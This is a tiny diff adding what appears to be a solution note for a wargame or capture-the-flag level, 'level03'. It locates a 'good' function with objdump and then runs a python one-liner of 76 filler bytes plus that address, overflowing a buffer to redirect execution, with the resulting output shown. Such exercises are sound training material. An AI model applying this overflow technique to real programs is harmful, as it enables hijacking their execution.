@@ -1,0 +1,7 @@
+$ objdump -S level03 | grep good
+08048474 <good>:
+
+./level03 $(python -c 'print "a"*76 + "\x74\x84\x04\x08"')
+This is exciting we're going to 0x8048474
+
+
